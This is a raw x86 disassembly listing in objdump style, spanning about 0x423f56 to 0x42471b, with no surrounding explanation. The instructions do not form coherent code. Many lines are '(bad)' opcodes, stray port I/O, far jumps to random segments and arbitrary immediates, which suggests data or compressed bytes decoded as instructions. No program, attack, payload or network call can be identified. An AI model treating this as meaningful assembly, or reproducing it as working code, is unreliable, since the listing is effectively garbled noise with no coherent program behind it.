  423f56:	add    BYTE PTR [eax],al
  423f58:	add    BYTE PTR [eax],al
  423f5a:	cmp    DWORD PTR [ecx+ecx*4],ebx
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x23e902b9
  423f67:	inc    edi
  423f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f69:	sub    ebx,DWORD PTR [eax+edi*4+0x1fc0001]
  423f70:	add    BYTE PTR [eax],al
  423f72:	sbb    eax,0xd9fc4413
  423f77:	jae    0x423f5e
  423f79:	jp     0x423f05
  423f7b:	ins    DWORD PTR es:[edi],dx
  423f7c:	sbb    ax,0x6269
  423f80:	pop    eax
  423f81:	call   0x13215ff7
  423f86:	push   ss
  423f87:	je     0x423f1d
  423f89:	in     eax,dx
  423f8a:	ret    
  423f8b:	fnsave [ecx-0x69]
  423f8e:	jmp    0x2f325cc
  423f93:	stos   DWORD PTR es:[edi],eax
  423f94:	pop    esi
  423f95:	(bad)  
  423f96:	int3   
  423f97:	mov    ecx,0x7ebaa2f3
  423f9c:	fld    DWORD PTR [ecx+ebp*1+0x5b1c0e85]
  423fa3:	js     0x423fa1
  423fa5:	int3   
  423fa6:	sar    BYTE PTR [edi+eiz*1+0x7b3013a8],1
  423fad:	fs leave 
  423faf:	imul   edx,DWORD PTR [ebp+0x69fad184],0x39295da1
  423fb9:	loope  0x423fbc
  423fbb:	mov    bl,0x86
  423fbd:	xor    ebx,esp
  423fbf:	mov    esp,0x43ecf1c
  423fc4:	ret    
  423fc5:	and    ch,BYTE PTR [esi-0x4c08fdd6]
  423fcb:	sbb    DWORD PTR [eax+edx*1],ebp
  423fce:	imul   ebp,DWORD PTR [edi],0x29
  423fd1:	inc    ecx
  423fd2:	mov    WORD PTR [eax+0x68],gs
  423fd5:	push   es
  423fd6:	sahf   
  423fd7:	mov    al,ds:0x615f2f5c
  423fdc:	mov    ecx,0xc433253a
  423fe1:	add    ebx,DWORD PTR [ecx]
  423fe3:	je     0x423f74
  423fe5:	jecxz  0x423fe0
  423fe7:	xor    ebx,edx
  423fe9:	cmp    ebx,DWORD PTR [ecx+ecx*1]
  423fec:	in     al,0xe1
  423fee:	fcom   DWORD PTR [ebp+0x63d17741]
  423ff4:	sbb    cl,dl
  423ff6:	cmp    edi,ebp
  423ff8:	cmp    DWORD PTR [ecx],eax
  423ffa:	in     al,dx
  423ffb:	and    al,0x1
  423ffd:	and    al,BYTE PTR [ecx]
  423fff:	pusha  
  424000:	inc    edx
  424001:	test   eax,0xaf00bf5e
  424006:	into   
  424007:	ins    DWORD PTR es:[edi],dx
  424008:	retf   0x1dda
  42400b:	cmp    eax,0x5b46c01f
  424010:	and    al,0xae
  424012:	pop    ss
  424013:	and    al,0x6b
  424015:	dec    ebx
  424016:	(bad)  [edx-0xa57bd8c]
  42401c:	ficom  WORD PTR [ebx]
  42401e:	stos   DWORD PTR es:[edi],eax
  42401f:	and    dh,dh
  424021:	out    dx,eax
  424022:	mov    dl,0x6d
  424024:	fwait
  424025:	xchg   edx,eax
  424026:	xor    DWORD PTR [esp+eax*8+0x5ed0a534],ebx
  42402d:	or     ebx,ecx
  42402f:	movzx  esi,WORD PTR ds:0x29e5297f
  424036:	mov    al,ch
  424038:	scas   al,BYTE PTR es:[edi]
  424039:	jmp    0xca94:0x2482eaae
  424040:	pop    esi
  424041:	mov    DWORD PTR [eax-0x48],esi
  424044:	retf   0x34fb
  424047:	push   edx
  424048:	jb     0x424005
  42404a:	fstp   DWORD PTR [edi]
  42404c:	scas   eax,DWORD PTR es:[edi]
  42404d:	mov    ch,BYTE PTR [edx+ebx*2]
  424050:	retf   
  424051:	repz shr DWORD PTR [ecx-0x4e],0x31
  424056:	jge    0x4240b4
  424058:	mov    ds:0xdf4231af,eax
  42405d:	sub    DWORD PTR [edx-0xcbc0ce2],ebp
  424063:	mov    ebp,0x4a47f6a0
  424068:	cmp    BYTE PTR [ecx-0x5034637a],ah
  42406e:	push   esp
  42406f:	fstp   DWORD PTR [edx-0x6dce3dc4]
  424075:	and    eax,esi
  424077:	mov    ebp,0x87ba75aa
  42407c:	aaa    
  42407d:	jns    0x4240b4
  42407f:	es pop es
  424081:	pusha  
  424082:	fld    QWORD PTR [edx+0x70f50bab]
  424088:	(bad)  
  424089:	mov    gs,WORD PTR [esi+0x4b]
  42408c:	adc    eax,0xde7c69f1
  424091:	mov    edx,0xa28f3109
  424096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424097:	cmc    
  424098:	repnz stc 
  42409a:	ins    DWORD PTR es:[edi],dx
  42409b:	sbb    DWORD PTR ds:0x9f90e4af,edi
  4240a1:	popf   
  4240a2:	cmp    ebp,DWORD PTR [edx]
  4240a4:	lds    edi,FWORD PTR [edi-0x24]
  4240a7:	inc    DWORD PTR [edi]
  4240a9:	add    esp,DWORD PTR [eax]
  4240ab:	mov    bh,0x33
  4240ad:	mov    dl,0xa8
  4240af:	jb     0x424087
  4240b1:	jmp    0x4240fe
  4240b3:	lock pop esp
  4240b5:	xchg   esi,eax
  4240b6:	pop    ebx
  4240b7:	ret    
  4240b8:	cwde   
  4240b9:	cmp    DWORD PTR [esp+esi*8-0x30],0xffffff99
  4240be:	adc    DWORD PTR [edi+0x1dc5b415],esi
  4240c4:	es test al,0x47
  4240c7:	mov    edx,0x9b083890
  4240cc:	and    dh,BYTE PTR [eax]
  4240ce:	int    0x7
  4240d0:	mov    cl,0xcb
  4240d2:	cdq    
  4240d3:	or     al,0x69
  4240d5:	jne    0x424122
  4240d7:	ss jae 0x424068
  4240da:	push   edi
  4240db:	retf   
  4240dc:	in     eax,dx
  4240dd:	adc    DWORD PTR [eax-0x61575a56],edx
  4240e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240e4:	add    eax,0x7812d7a7
  4240e9:	popa   
  4240ea:	lods   eax,DWORD PTR ds:[esi]
  4240eb:	rcr    BYTE PTR [eax],cl
  4240ed:	pop    esi
  4240ee:	(bad)  
  4240ef:	in     al,dx
  4240f0:	int3   
  4240f1:	enter  0x8ec1,0x85
  4240f5:	out    dx,eax
  4240f6:	dec    esi
  4240f7:	xchg   edx,eax
  4240f8:	push   0xffffffbe
  4240fa:	or     ebx,ebp
  4240fc:	ds inc edx
  4240fe:	ins    BYTE PTR es:[edi],dx
  4240ff:	das    
  424100:	cld    
  424101:	xor    edi,ecx
  424103:	inc    eax
  424104:	xor    al,0xa
  424106:	call   0xc34e:0x8b1ad768
  42410d:	rol    DWORD PTR ds:0x3bb7021f,0x7c
  424114:	xchg   edi,eax
  424115:	dec    esi
  424116:	mov    edi,0x9365e697
  42411b:	cmc    
  42411c:	sti    
  42411d:	jg     0x424185
  42411f:	rcl    bh,cl
  424121:	add    ebx,edx
  424123:	jmp    0x424180
  424125:	xor    DWORD PTR [eax],ecx
  424127:	das    
  424128:	mov    ds,WORD PTR [esi*2+0x187623ac]
  42412f:	in     al,0xc2
  424131:	sar    ecx,1
  424133:	outs   dx,BYTE PTR ds:[esi]
  424134:	sub    edx,DWORD PTR [ecx]
  424136:	xor    al,0xcd
  424138:	sbb    ecx,edi
  42413a:	out    dx,eax
  42413b:	mov    ecx,0x13869eb3
  424140:	ins    DWORD PTR es:[edi],dx
  424141:	mov    edi,0x73ee3def
  424146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424147:	or     al,0xaa
  424149:	inc    edi
  42414a:	loop   0x42412e
  42414c:	cmp    ah,dh
  42414e:	dec    ebp
  42414f:	leave  
  424150:	inc    dl
  424152:	sbb    eax,0xa673381d
  424157:	arpl   WORD PTR [edi-0xf47e734],si
  42415d:	or     ah,BYTE PTR [ecx]
  42415f:	cmp    DWORD PTR [edx],0xb271ca4e
  424165:	adc    BYTE PTR [eax-0x2d],dl
  424168:	ins    DWORD PTR es:[edi],dx
  424169:	push   ecx
  42416a:	adc    ch,BYTE PTR [edi]
  42416c:	fldcw  WORD PTR [ebx]
	...
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	cmp    dl,BYTE PTR [esi]
  424188:	int3   
  424189:	imul   ebx,DWORD PTR [eax-0x3fffe46],0x1
  424190:	add    BYTE PTR [eax],al
  424192:	hlt    
  424193:	xchg   ecx,eax
  424194:	jmp    0x42417c
  424196:	retf   0xa06c
  424199:	xor    eax,0xc4d7f75e
  42419e:	dec    edx
  42419f:	mov    ebp,0x79ed6667
  4241a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241a5:	adc    bh,ch
  4241a7:	or     edi,DWORD PTR [ebx+0x14]
  4241aa:	jne    0x424162
  4241ac:	pop    eax
  4241ad:	out    0x4,eax
  4241af:	pushf  
  4241b0:	leave  
  4241b1:	or     eax,0x8f9588ca
  4241b6:	sahf   
  4241b7:	(bad)  
  4241b8:	cmp    al,BYTE PTR [ebp+0x2d]
  4241bb:	inc    esi
  4241bc:	clc    
  4241bd:	js     0x42413f
  4241bf:	xchg   edx,eax
  4241c0:	lods   al,BYTE PTR ds:[esi]
  4241c1:	ja     0x424169
  4241c3:	xchg   edx,eax
  4241c4:	sbb    eax,0x923394cf
  4241c9:	dec    edi
  4241ca:	push   ss
  4241cb:	pop    ecx
  4241cc:	mov    eax,ds:0xa71fafa7
  4241d1:	xchg   esi,eax
  4241d2:	sub    ebp,edi
  4241d4:	aam    0x69
  4241d6:	jbe    0x4241fe
  4241d8:	clc    
  4241d9:	mov    ds:0xf1a08d54,al
  4241de:	aam    0xa4
  4241e0:	inc    esi
  4241e1:	shl    DWORD PTR [ebx-0x55b9a462],cl
  4241e7:	dec    ebx
  4241e8:	push   eax
  4241e9:	mov    ebp,0xe4c4ad13
  4241ee:	or     al,0xbb
  4241f0:	jns    0x424257
  4241f2:	and    BYTE PTR [eax+0x793725e],cl
  4241f8:	mov    cl,0xa3
  4241fa:	push   esp
  4241fb:	icebp  
  4241fc:	xchg   ebp,eax
  4241fd:	pop    ds
  4241fe:	(bad)
  424201:	push   esp
  424202:	sar    DWORD PTR [edi+0x3d],1
  424205:	aam    0xda
  424207:	cmp    eax,0x7a30a61c
  42420c:	jnp    0x424242
  42420e:	inc    ebp
  42420f:	mov    al,ds:0x91f1359f
  424214:	das    
  424215:	lods   eax,DWORD PTR ds:[esi]
  424216:	inc    eax
  424217:	add    ah,dl
  424219:	cmp    bl,BYTE PTR [edi-0x7e65769a]
  42421f:	pop    ebx
  424220:	sbb    BYTE PTR [bx+di-0x13f],ch
  424225:	jecxz  0x4241bb
  424227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424228:	loop   0x42421f
  42422a:	add    ah,BYTE PTR [ecx-0x59]
  42422d:	test   eax,0xe3d4f857
  424232:	fcomp  DWORD PTR [esi+ecx*4+0x3]
  424236:	ss inc edi
  424238:	dec    DWORD PTR [ebx-0xf4b361d]
  42423e:	dec    edi
  42423f:	enter  0xb8cf,0x1
  424243:	mov    ch,0x6b
  424245:	and    BYTE PTR [edi+0x2e],0xdd
  424249:	jecxz  0x4241ee
  42424b:	call   0x6e1:0x5ad97592
  424252:	xor    eax,0x23bbe65d
  424257:	push   edx
  424258:	inc    ecx
  424259:	dec    edx
  42425a:	icebp  
  42425b:	push   ds
  42425c:	mov    ebx,0xd58eb3a1
  424261:	loopne 0x424285
  424263:	daa    
  424264:	stos   DWORD PTR es:[edi],eax
  424265:	cmp    edx,DWORD PTR [ecx]
  424267:	ins    BYTE PTR es:[edi],dx
  424268:	push   ds
  424269:	pop    edx
  42426a:	dec    esi
  42426b:	jle    0x4242c4
  42426d:	jae    0x424276
  42426f:	in     eax,0x20
  424271:	adc    al,0x6e
  424273:	add    eax,0xa5a8d9fe
  424278:	in     al,dx
  424279:	popf   
  42427a:	pop    ss
  42427b:	push   ss
  42427c:	mov    edi,DWORD PTR [edi]
  42427e:	ret    0xf450
  424281:	scas   eax,DWORD PTR es:[edi]
  424282:	nop
  424283:	xor    eax,0x6817dced
  424288:	adc    BYTE PTR [ebx+0x2432a702],dl
  42428e:	push   esi
  42428f:	push   0x5f4c9ca5
  424294:	mov    esp,0xb9a2f088
  424299:	(bad)  
  42429a:	fistp  QWORD PTR [edx+0x786350f0]
  4242a0:	push   ecx
  4242a1:	mov    dl,0x63
  4242a3:	and    BYTE PTR [edi+0x3ca623c2],bl
  4242a9:	retf   
  4242aa:	jb     0x42422f
  4242ac:	(bad)  
  4242ad:	push   0xc18b082d
  4242b2:	pop    ebx
  4242b3:	pop    esp
  4242b4:	dec    edi
  4242b5:	pop    ecx
  4242b6:	aas    
  4242b7:	in     al,dx
  4242b8:	mov    ch,0xeb
  4242ba:	out    0x85,al
  4242bc:	or     ebp,DWORD PTR [edi-0x4c]
  4242bf:	fwait
  4242c0:	cmp    dh,BYTE PTR [edi-0x1b]
  4242c3:	mov    al,ds:0x99412af4
  4242c8:	xchg   esi,eax
  4242c9:	cdq    
  4242ca:	les    ecx,FWORD PTR [esi+0x4fbbcf79]
  4242d0:	ror    BYTE PTR [edi],1
  4242d2:	or     edi,DWORD PTR [esi+ebx*8-0xd]
  4242d6:	(bad)  
  4242d7:	push   cs
  4242d8:	jmp    0x7831:0x8e4a6721
  4242df:	adc    BYTE PTR [edi],ch
  4242e1:	xchg   ebx,eax
  4242e2:	js     0x424320
  4242e4:	adc    BYTE PTR [ebx+0x763f0428],cl
  4242ea:	sbb    al,0xb2
  4242ec:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4242ee:	aas    
  4242ef:	sbb    ah,ah
  4242f1:	mov    bh,0xdf
  4242f3:	cmp    eax,0x22edb920
  4242f8:	sti    
  4242f9:	add    cl,BYTE PTR [esi]
  4242fb:	cs xor al,0x5b
  4242fe:	add    ch,BYTE PTR [ebx-0x4a186493]
  424304:	retf   
  424305:	test   ah,ah
  424307:	enter  0xfd3a,0x5e
  42430b:	xor    ebp,DWORD PTR [eax]
  42430d:	leave  
  42430e:	jne    0x424339
  424310:	fs push eax
  424312:	retf   
  424313:	aas    
  424314:	jp     0x424368
  424316:	xchg   edx,eax
  424317:	(bad)  
  424318:	outs   dx,DWORD PTR ds:[esi]
  424319:	out    dx,eax
  42431a:	jmp    0x9e111510
  42431f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424320:	or     al,BYTE PTR [esi+0x57c08305]
  424326:	imul   ecx,DWORD PTR [edi-0x1612af07],0x8
  42432d:	xor    al,0xc5
  42432f:	ret    0xec1b
  424332:	jmp    0x3595:0x9f1e5f43
  424339:	cmp    BYTE PTR [edx+0x776b595a],bl
  42433f:	jmp    0xca3:0x343749ba
  424346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424347:	push   ecx
  424348:	adc    BYTE PTR [ebp+0x4d],cl
  42434b:	into   
  42434c:	in     eax,dx
  42434d:	mov    ebx,0xb6703c7f
  424352:	add    edx,DWORD PTR [ebp-0x61]
  424355:	jb     0x4243ab
  424357:	adc    esp,DWORD PTR [edx+0x59]
  42435a:	ds js  0x4243a6
  42435d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42435e:	cmp    eax,0x2d513390
  424363:	mov    eax,0x4567f9e5
  424368:	cmp    al,0x3e
  42436a:	aad    0x56
  42436c:	(bad)  
  42436d:	sti    
  42436e:	xor    BYTE PTR [ebx-0x19600ecf],ah
  424374:	shr    BYTE PTR [esi],cl
  424376:	fldenv [ebx]
  424378:	dec    ebx
  424379:	dec    esp
  42437a:	and    bl,0x28
  42437d:	clc    
  42437e:	or     BYTE PTR [esi-0x24],al
  424381:	aam    0x2b
  424383:	push   ecx
  424384:	mov    al,0x7a
  424386:	(bad)  
  424387:	ror    BYTE PTR [ebx-0x40],1
  42438a:	mov    DWORD PTR [esi+0x97b],esi
	...
  424398:	add    BYTE PTR [eax],al
  42439a:	adc    bl,al
  42439c:	arpl   WORD PTR [edx-0x15],si
  42439f:	sti    
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	push   ds
  4243a7:	test   BYTE PTR ds:[eax+0x1bc94],dh
  4243ae:	cld    
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    BYTE PTR [ebx+0x1edad42a],ah
  4243b7:	outs   dx,BYTE PTR ds:[esi]
  4243b8:	in     eax,dx
  4243b9:	fwait
  4243ba:	xlat   BYTE PTR ds:[ebx]
  4243bb:	fmul   DWORD PTR [eax]
  4243bd:	je     0x424429
  4243bf:	pop    edx
  4243c0:	xlat   BYTE PTR ds:[ebx]
  4243c1:	xor    DWORD PTR [ecx+0x484fae69],0x6
  4243c8:	iret   
  4243c9:	ret    0xb79c
  4243cc:	mov    edi,0xc2e892b5
  4243d1:	dec    eax
  4243d2:	cmovle eax,DWORD PTR [edx-0x16]
  4243d6:	inc    ecx
  4243d7:	cmp    DWORD PTR [ebx+esi*4+0x45529be],ebp
  4243de:	jecxz  0x4243b2
  4243e0:	inc    ebp
  4243e1:	fs jmp 0xb2b8f887
  4243e7:	ja     0x42444e
  4243e9:	xchg   esi,eax
  4243ea:	stc    
  4243eb:	add    eax,0xbbff800e
  4243f0:	push   ebp
  4243f1:	imul   esi,DWORD PTR [ebx+0x60],0x17
  4243f5:	jns    0x42446f
  4243f7:	out    0xba,al
  4243f9:	push   esp
  4243fa:	outs   dx,BYTE PTR ds:[esi]
  4243fb:	dec    edx
  4243fc:	dec    edi
  4243fd:	mov    dh,0xf8
  4243ff:	or     eax,0x691542a2
  424404:	imul   edx,ebx,0x60
  424407:	jno    0x424457
  424409:	retf   
  42440a:	jmp    0x378b17f7
  42440f:	sub    ch,al
  424411:	jmp    0x3067b09c
  424416:	sti    
  424417:	inc    ecx
  424418:	cdq    
  424419:	mov    ecx,DWORD PTR [edi-0x7c]
  42441c:	jg     0x424457
  42441e:	sbb    dl,BYTE PTR [ebx+edx*8-0x6397563e]
  424425:	loope  0x424472
  424427:	or     ebp,DWORD PTR [esi-0x1b]
  42442a:	fwait
  42442b:	addr16 push eax
  42442d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42442e:	sbb    ecx,edx
  424430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424431:	mov    cl,0xc4
  424433:	test   BYTE PTR [ebx+ebp*4-0x3e],dh
  424437:	mov    ah,0xd2
  424439:	imul   esp,DWORD PTR [edi],0x284287e3
  42443f:	aaa    
  424440:	fsubr  DWORD PTR [ecx]
  424442:	popa   
  424443:	mov    ds:0x3e702874,eax
  424448:	jae    0x424434
  42444a:	jno    0x424485
  42444c:	inc    esi
  42444d:	icebp  
  42444e:	push   cs
  42444f:	sub    cl,dl
  424451:	cmp    eax,0x6cec6f56
  424456:	and    edi,DWORD PTR [ecx]
  424458:	cmp    al,0xdc
  42445a:	dec    edx
  42445b:	pop    ds
  42445c:	rol    BYTE PTR [eax+0x6d],0xe8
  424460:	sub    DWORD PTR [eax+0x3f],edx
  424463:	test   DWORD PTR [eax+esi*8-0x19],0xefe67cb9
  42446b:	jl     0x424488
  42446d:	mov    ah,0xf2
  42446f:	imul   eax,DWORD PTR [esi-0x6b85aa09],0x64
  424476:	mov    dl,0xeb
  424478:	popa   
  424479:	cdq    
  42447a:	outs   dx,DWORD PTR ds:[esi]
  42447b:	out    0xe8,al
  42447d:	lds    ecx,FWORD PTR [esi+0x5cb1ca7e]
  424483:	xchg   edx,eax
  424484:	mov    al,ds:0xda9c537c
  424489:	xchg   esp,eax
  42448a:	std    
  42448b:	sbb    ah,BYTE PTR [edx]
  42448d:	shl    BYTE PTR [edx-0x65],1
  424490:	add    esp,DWORD PTR [ecx-0x7d]
  424493:	ins    BYTE PTR es:[edi],dx
  424494:	add    eax,0x20db72f3
  424499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42449a:	push   edi
  42449b:	mov    bl,0x26
  42449d:	popa   
  42449e:	lahf   
  42449f:	xor    dl,BYTE PTR [edx-0x4d]
  4244a2:	cmp    bl,0x4a
  4244a5:	jg     0x424497
  4244a7:	xchg   edi,eax
  4244a8:	test   eax,0xbe0a2138
  4244ad:	pop    esp
  4244ae:	or     al,0xaf
  4244b0:	dec    ebp
  4244b1:	xchg   ecx,eax
  4244b2:	xchg   esi,eax
  4244b3:	int3   
  4244b4:	fistp  WORD PTR [edx+0x71c9953b]
  4244ba:	imul   esi,DWORD PTR [edx+0x194616fc],0xffffff80
  4244c1:	ja     0x424507
  4244c3:	xchg   ecx,eax
  4244c4:	mov    ebp,0x714febe0
  4244c9:	bound  ecx,QWORD PTR [ebx+0x3]
  4244cc:	mov    dh,0xa4
  4244ce:	retf   0x1d83
  4244d1:	adc    bl,BYTE PTR [esi]
  4244d3:	pop    ebp
  4244d4:	sub    eax,0xaf3dac91
  4244d9:	sub    edi,DWORD PTR [ebx]
  4244db:	push   edx
  4244dc:	and    dl,BYTE PTR [edx-0xb]
  4244df:	push   esp
  4244e0:	lea    ebx,[edi-0x3991a906]
  4244e6:	cmp    ebx,DWORD PTR ds:0xe1c1390b
  4244ec:	rcr    DWORD PTR [esi],1
  4244ee:	dec    edi
  4244ef:	ror    DWORD PTR [ecx-0x58],0xa3
  4244f3:	aaa    
  4244f4:	inc    edx
  4244f5:	mov    ss,WORD PTR [ebx]
  4244f7:	pop    ds
  4244f8:	shl    ebp,cl
  4244fa:	fwait
  4244fb:	outs   dx,DWORD PTR ds:[esi]
  4244fc:	dec    ecx
  4244fd:	pop    ebp
  4244fe:	mov    DWORD PTR [edx-0x57],edi
  424501:	es pusha 
  424503:	into   
  424504:	ret    
  424505:	cmp    eax,0xe1f92e72
  42450a:	or     al,al
  42450c:	push   edi
  42450d:	js     0x424571
  42450f:	jp     0x4244ff
  424511:	ja     0x424560
  424513:	mov    ah,BYTE PTR [ebp+eax*2+0x6a]
  424517:	xchg   ebp,eax
  424518:	ret    0x6d59
  42451b:	xor    al,0xd2
  42451d:	pop    esp
  42451e:	clc    
  42451f:	fst    DWORD PTR [eax]
  424521:	loope  0x4244bc
  424523:	cmp    BYTE PTR [ebx+0x7a],bh
  424526:	inc    esi
  424527:	retf   
  424528:	push   ecx
  424529:	jb     0x42459b
  42452b:	ror    BYTE PTR [ecx-0x3493e7b4],1
  424531:	cmp    eax,0x959c04b5
  424536:	loope  0x42455b
  424538:	(bad)  
  424539:	xchg   esi,eax
  42453a:	enter  0xe7b1,0xdc
  42453e:	test   esp,esi
  424540:	push   es
  424541:	adc    ecx,ebp
  424543:	jmp    0x3cec:0x40fa325d
  42454a:	push   ss
  42454b:	dec    edx
  42454c:	ins    BYTE PTR es:[edi],dx
  42454d:	leave  
  42454e:	adc    dh,bh
  424550:	fwait
  424551:	cmp    ah,bh
  424553:	and    BYTE PTR [edi+0x6b],bh
  424556:	sbb    BYTE PTR [eax+0x7d],dl
  424559:	inc    eax
  42455a:	push   esi
  42455b:	add    al,bh
  42455d:	add    ebp,edi
  42455f:	aad    0xcd
  424561:	jmp    0x4245d1
  424563:	mov    edi,DWORD PTR [edx-0x3e]
  424566:	push   esp
  424567:	and    esp,DWORD PTR [edx]
  424569:	scas   eax,DWORD PTR es:[edi]
  42456a:	sbb    dh,BYTE PTR [edx-0xd]
  42456d:	and    dh,bl
  42456f:	mov    ebx,0xfec2b3de
  424574:	xor    al,0x2f
  424576:	fidiv  DWORD PTR [eax]
  424578:	jae    0x42452e
  42457a:	mov    ebp,DWORD PTR [ecx*2-0x1f4c8935]
  424581:	mov    ebp,0x503db9b5
  424586:	lods   eax,DWORD PTR ds:[esi]
  424587:	(bad)  
  424588:	jmp    0x424573
  42458a:	dec    edx
  42458b:	ficomp WORD PTR [ebx+ebx*8+0x29]
  42458f:	push   0xffffffee
  424591:	and    ecx,esp
  424593:	cmc    
  424594:	push   ecx
  424595:	icebp  
  424596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424597:	adc    BYTE PTR [esi+ecx*1-0x180e0e6b],dl
  42459e:	cld    
  42459f:	mov    al,0x46
  4245a1:	jp     0x42455d
  4245a3:	push   ecx
  4245a4:	sub    ecx,DWORD PTR [eax+ebx*2]
  4245a7:	adc    BYTE PTR [esi+0x34f0838],dl
  4245ad:	push   edi
	...
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x52058ab7]
  4245c9:	sahf   
  4245ca:	nop
  4245cb:	mov    esi,0x1fc0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	cmp    ebx,edx
  4245d4:	jp     0x424593
  4245d6:	int3   
  4245d7:	add    DWORD PTR [edx+ebx*2+0x49],esp
  4245db:	in     al,0x1b
  4245dd:	out    0xbf,al
  4245df:	bound  ebx,QWORD PTR [edi-0x730fd953]
  4245e5:	adc    DWORD PTR [ecx],ecx
  4245e7:	das    
  4245e8:	inc    ebx
  4245e9:	loopne 0x4245eb
  4245eb:	mov    al,BYTE PTR [ebx-0x25ba5c15]
  4245f1:	into   
  4245f2:	outs   dx,DWORD PTR ds:[esi]
  4245f3:	push   esp
  4245f4:	mov    esp,0x728f1e5f
  4245f9:	outs   dx,DWORD PTR ds:[esi]
  4245fa:	mov    dh,0xa4
  4245fc:	and    bl,BYTE PTR [edx-0x4f787d99]
  424602:	arpl   sp,cx
  424604:	nop
  424605:	mov    DWORD PTR [edi-0x2f5e2d18],esi
  42460b:	in     al,0x3a
  42460d:	adc    BYTE PTR [edi+0x38],ch
  424610:	cmp    bh,BYTE PTR [esi-0x6c]
  424613:	sub    al,0xe6
  424615:	jb     0x4245e7
  424617:	jbe    0x424680
  424619:	jp     0x424666
  42461b:	and    edi,DWORD PTR [edx+0x2c]
  42461e:	inc    edx
  42461f:	xor    DWORD PTR [edx-0x3cf77be4],0x44b8fbeb
  424629:	add    eax,edi
  42462b:	das    
  42462c:	sbb    cl,al
  42462e:	pop    edi
  42462f:	or     eax,0x98fb52ba
  424634:	jmp    0x4246b1
  424636:	imul   ecx,DWORD PTR [esi+0x13],0xb751b3ad
  42463d:	dec    edi
  42463e:	dec    esi
  42463f:	test   al,0xbd
  424641:	push   edi
  424642:	adc    ecx,DWORD PTR [eax]
  424644:	jnp    0x4245c8
  424646:	mov    edi,0xdbc1710
  42464b:	pusha  
  42464c:	ins    BYTE PTR es:[edi],dx
  42464d:	cs mov ah,0x8e
  424650:	(bad)  
  424651:	pop    edx
  424652:	mov    ds:0x9eb0054f,eax
  424657:	loopne 0x424671
  424659:	xchg   ebx,eax
  42465a:	xor    BYTE PTR [esi],cl
  42465c:	sbb    BYTE PTR cs:[eax-0x4e],0xd6
  424661:	sbb    dh,BYTE PTR [ecx-0x764474b8]
  424667:	lods   al,BYTE PTR ds:[esi]
  424668:	mov    eax,0x3d9f44e4
  42466d:	call   0x5b034b8
  424672:	sub    edi,DWORD PTR [ecx-0x69]
  424675:	and    DWORD PTR [edi],edi
  424677:	pop    eax
  424678:	repz xchg edx,eax
  42467a:	pop    eax
  42467b:	adc    al,0x63
  42467d:	imul   esi,edi,0xffffffe9
  424680:	add    ebx,DWORD PTR [esi*2-0x1585e4bb]
  424687:	mov    ds:0x856b37f5,eax
  42468c:	popa   
  42468d:	jb     0x424613
  42468f:	dec    ebx
  424690:	stos   BYTE PTR es:[edi],al
  424691:	inc    ebp
  424692:	idiv   DWORD PTR [esi]
  424694:	dec    ebx
  424695:	push   esi
  424696:	add    esi,DWORD PTR [eax]
  424698:	push   eax
  424699:	or     DWORD PTR [edx+0x3d],edx
  42469c:	pusha  
  42469d:	xor    DWORD PTR [ebx+0x4fb89db8],0xffffff9f
  4246a4:	pop    ds
  4246a5:	sar    BYTE PTR [ecx-0x17747872],0x1f
  4246ac:	add    dl,BYTE PTR [esi+0x3954ac22]
  4246b2:	ds push esp
  4246b4:	icebp  
  4246b5:	aas    
  4246b6:	mov    eax,ds:0xa8322b42
  4246bb:	jle    0x42465f
  4246bd:	into   
  4246be:	pop    edi
  4246bf:	push   es
  4246c0:	xchg   BYTE PTR [esi],bh
  4246c2:	test   al,0x2d
  4246c4:	add    al,0x2e
  4246c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c8:	(bad)  
  4246c9:	sub    al,0xc
  4246cb:	stos   BYTE PTR es:[edi],al
  4246cc:	repnz sub bl,BYTE PTR [edi-0x6e]
  4246d0:	or     DWORD PTR [esi-0x3b323bec],esi
  4246d6:	mov    al,0xf4
  4246d8:	stc    
  4246d9:	push   ds
  4246da:	(bad)  
  4246db:	dec    esp
  4246dc:	cld    
  4246dd:	dec    edx
  4246de:	je     0x4246f3
  4246e0:	jno    0x4246fe
  4246e2:	sub    DWORD PTR [ecx+0x47],ebx
  4246e5:	xchg   BYTE PTR [esi-0x3b],bl
  4246e8:	lock push eax
  4246ea:	dec    edi
  4246eb:	xchg   ecx,eax
  4246ec:	jne    0x4246e0
  4246ee:	sub    eax,0xd275d629
  4246f3:	sahf   
  4246f4:	mov    gs,WORD PTR [ebx-0x17895905]
  4246fa:	ja     0x424766
  4246fc:	lds    eax,FWORD PTR [ecx]
  4246fe:	mov    bl,0x6c
  424700:	scas   eax,DWORD PTR es:[edi]
  424701:	add    al,0x50
  424703:	mov    ebx,0xc22953d8
  424708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424709:	xlat   BYTE PTR ds:[ebx]
  42470a:	xor    bh,bh
  42470c:	xor    ecx,DWORD PTR [edx+0x1865f54f]
  424712:	addr16 pop esi
  424714:	imul   ecx,DWORD PTR [esi-0x52],0xc8764872
  42471b:	inc    ebp
